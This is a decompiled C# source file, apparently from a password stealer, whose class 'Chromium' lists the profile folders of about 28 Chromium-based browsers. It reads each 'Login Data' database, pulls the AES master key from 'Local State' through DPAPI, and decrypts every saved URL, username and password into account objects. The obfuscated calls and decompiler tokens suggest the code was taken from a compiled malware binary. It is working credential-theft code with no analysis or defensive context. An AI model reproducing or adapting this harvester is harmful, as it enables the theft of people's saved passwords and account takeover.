using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace ChromeRecovery
{
	// Token: 0x0200004E RID: 78
	public class Chromium
	{
		// Token: 0x0600025B RID: 603 RVA: 0x00011EB4 File Offset: 0x000100B4
		public static List<Account> Grab()
		{
			Dictionary<string, string> dictionary = new Dictionary<string, string>
			{
				{
					"Chrome",
					Chromium.LocalApplicationData + "\\Google\\Chrome\\User Data"
				},
				{
					"Opera",
					Path.Combine(Chromium.ApplicationData, "Opera Software\\Opera Stable")
				},
				{
					"Yandex",
					Path.Combine(Chromium.LocalApplicationData, "Yandex\\YandexBrowser\\User Data")
				},
				{
					"360 Browser",
					Chromium.LocalApplicationData + "\\360Chrome\\Chrome\\User Data"
				},
				{
					"Comodo Dragon",
					Path.Combine(Chromium.LocalApplicationData, "Comodo\\Dragon\\User Data")
				},
				{
					"CoolNovo",
					Path.Combine(Chromium.LocalApplicationData, "MapleStudio\\ChromePlus\\User Data")
				},
				{
					"SRWare Iron",
					Path.Combine(Chromium.LocalApplicationData, "Chromium\\User Data")
				},
				{
					"Torch Browser",
					Path.Combine(Chromium.LocalApplicationData, "Torch\\User Data")
				},
				{
					"Brave Browser",
					Path.Combine(Chromium.LocalApplicationData, "BraveSoftware\\Brave-Browser\\User Data")
				},
				{
					"Iridium Browser",
					Chromium.LocalApplicationData + "\\Iridium\\User Data"
				},
				{
					"7Star",
					Path.Combine(Chromium.LocalApplicationData, "7Star\\7Star\\User Data")
				},
				{
					"Amigo",
					Path.Combine(Chromium.LocalApplicationData, "Amigo\\User Data")
				},
				{
					"CentBrowser",
					Path.Combine(Chromium.LocalApplicationData, "CentBrowser\\User Data")
				},
				{
					"Chedot",
					Path.Combine(Chromium.LocalApplicationData, "Chedot\\User Data")
				},
				{
					"CocCoc",
					Path.Combine(Chromium.LocalApplicationData, "CocCoc\\Browser\\User Data")
				},
				{
					"Elements Browser",
					Path.Combine(Chromium.LocalApplicationData, "Elements Browser\\User Data")
				},
				{
					"Epic Privacy Browser",
					Path.Combine(Chromium.LocalApplicationData, "Epic Privacy Browser\\User Data")
				},
				{
					"Kometa",
					Path.Combine(Chromium.LocalApplicationData, "Kometa\\User Data")
				},
				{
					"Orbitum",
					Path.Combine(Chromium.LocalApplicationData, "Orbitum\\User Data")
				},
				{
					"Sputnik",
					Path.Combine(Chromium.LocalApplicationData, "Sputnik\\Sputnik\\User Data")
				},
				{
					"uCozMedia",
					Path.Combine(Chromium.LocalApplicationData, "uCozMedia\\Uran\\User Data")
				},
				{
					"Vivaldi",
					Path.Combine(Chromium.LocalApplicationData, "Vivaldi\\User Data")
				},
				{
					"Sleipnir 6",
					Path.Combine(Chromium.ApplicationData, "Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer")
				},
				{
					"Citrio",
					Path.Combine(Chromium.LocalApplicationData, "CatalinaGroup\\Citrio\\User Data")
				},
				{
					"Coowon",
					Path.Combine(Chromium.LocalApplicationData, "Coowon\\Coowon\\User Data")
				},
				{
					"Liebao Browser",
					Path.Combine(Chromium.LocalApplicationData, "liebao\\User Data")
				},
				{
					"QIP Surf",
					Path.Combine(Chromium.LocalApplicationData, "QIP Surf\\User Data")
				},
				{
					"Edge Chromium",
					Path.Combine(Chromium.LocalApplicationData, "Microsoft\\Edge\\User Data")
				}
			};
			List<Account> list = new List<Account>();
			foreach (KeyValuePair<string, string> keyValuePair in dictionary)
			{
				list.AddRange(Chromium.smethod_0(keyValuePair.Value, keyValuePair.Key, "logins"));
			}
			return list;
		}

		// Token: 0x0600025C RID: 604 RVA: 0x00012204 File Offset: 0x00010404
		private static List<Account> smethod_0(string string_0, string string_1, string string_2 = "logins")
		{
			List<string> list = Chromium.smethod_1(string_0);
			List<Account> list2 = new List<Account>();
			foreach (string text in list.ToArray())
			{
				if (File.Exists(text))
				{
					SQLiteHandler sqliteHandler;
					try
					{
						sqliteHandler = new SQLiteHandler(text);
					}
					catch (Exception ex)
					{
						Console.WriteLine(ex.ToString());
						goto IL_177;
					}
					if (sqliteHandler.ReadTable(string_2))
					{
						for (int num = 0; num <= sqliteHandler.GetRowCount() - 1; num++)
						{
							try
							{
								string value = sqliteHandler.GetValue(num, "origin_url");
								string value2 = sqliteHandler.GetValue(num, "username_value");
								string text2 = sqliteHandler.GetValue(num, "password_value");
								if (text2 != null)
								{
									if (text2.StartsWith("v10") || text2.StartsWith("v11"))
									{
										byte[] masterKey = Chromium.GetMasterKey(Directory.GetParent(text).Parent.FullName);
										if (masterKey == null)
										{
											goto IL_180;
										}
										text2 = Chromium.DecryptWithKey(Encoding.Default.GetBytes(text2), masterKey);
									}
									else
									{
										text2 = Chromium.Decrypt(text2);
									}
									if (!string.IsNullOrEmpty(value) && !string.IsNullOrEmpty(value2) && !string.IsNullOrEmpty(text2))
									{
										list2.Add(new Account
										{
											URL = value,
											UserName = value2,
											Password = text2,
											Application = string_1
										});
									}
									goto IL_180;
								}
								goto IL_180;
							}
							catch (Exception ex2)
							{
								Console.WriteLine(ex2.ToString());
								goto IL_180;
							}
							break;
							IL_180:;
						}
					}
				}
				IL_177:;
			}
			return list2;
		}

		// Token: 0x0600025D RID: 605 RVA: 0x000123C0 File Offset: 0x000105C0
		private static List<string> smethod_1(string string_0)
		{
			List<string> list = new List<string>
			{
				string_0 + "\\Default\\Login Data",
				string_0 + "\\Login Data"
			};
			if (Directory.Exists(string_0))
			{
				foreach (string text in Directory.GetDirectories(string_0))
				{
					if (text.Contains("Profile"))
					{
						list.Add(text + "\\Login Data");
					}
				}
			}
			return list;
		}

		// Token: 0x0600025E RID: 606 RVA: 0x0001243C File Offset: 0x0001063C
		public static string DecryptWithKey(byte[] encryptedData, byte[] MasterKey)
		{
			byte[] array = new byte[12];
			Array.Copy(encryptedData, 3, array, 0, 12);
			string result;
			try
			{
				byte[] array2 = new byte[encryptedData.Length - 15];
				Array.Copy(encryptedData, 15, array2, 0, encryptedData.Length - 15);
				byte[] array3 = new byte[16];
				byte[] array4 = new byte[array2.Length - array3.Length];
				Array.Copy(array2, array2.Length - 16, array3, 0, 16);
				Array.Copy(array2, 0, array4, 0, array2.Length - array3.Length);
				Class32 @class = new Class32();
				string @string = Encoding.UTF8.GetString(@class.method_0(MasterKey, array, null, array4, array3));
				result = @string;
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
				result = null;
			}
			return result;
		}

		// Token: 0x0600025F RID: 607 RVA: 0x000124F8 File Offset: 0x000106F8
		public static byte[] GetMasterKey(string LocalStateFolder)
		{
			string path = LocalStateFolder + "\\Local State";
			byte[] array = new byte[0];
			byte[] result;
			if (!File.Exists(path))
			{
				result = null;
			}
			else
			{
				MatchCollection matchCollection = new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(File.ReadAllText(path));
				foreach (object obj in matchCollection)
				{
					Match match = (Match)obj;
					if (match.Success)
					{
						array = Convert.FromBase64String(match.Groups[1].Value);
					}
				}
				byte[] array2 = new byte[array.Length - 5];
				Array.Copy(array, 5, array2, 0, array.Length - 5);
				try
				{
					result = ProtectedData.Unprotect(array2, null, DataProtectionScope.CurrentUser);
				}
				catch (Exception ex)
				{
					Console.WriteLine(ex.ToString());
					result = null;
				}
			}
			return result;
		}

		// Token: 0x06000260 RID: 608 RVA: 0x000125F4 File Offset: 0x000107F4
		public static string Decrypt(string encryptedData)
		{
			string result;
			if (encryptedData == null || encryptedData.Length == 0)
			{
				result = null;
			}
			else
			{
				try
				{
					result = Encoding.UTF8.GetString(ProtectedData.Unprotect(Encoding.Default.GetBytes(encryptedData), null, DataProtectionScope.CurrentUser));
				}
				catch (Exception ex)
				{
					Console.WriteLine(ex.ToString());
					result = null;
				}
			}
			return result;
		}

		// Token: 0x06000261 RID: 609 RVA: 0x0000276F File Offset: 0x0000096F
		public Chromium()
		{
			Class34.A1SfXVPz7w9eh();
			base..ctor();
		}

		// Token: 0x06000262 RID: 610 RVA: 0x00002F8A File Offset: 0x0000118A
		// Note: this type is marked as 'beforefieldinit'.
		static Chromium()
		{
			Class34.A1SfXVPz7w9eh();
			Chromium.LocalApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			Chromium.ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		}

		// Token: 0x0400011F RID: 287
		public static string LocalApplicationData;

		// Token: 0x04000120 RID: 288
		public static string ApplicationData;
	}
}
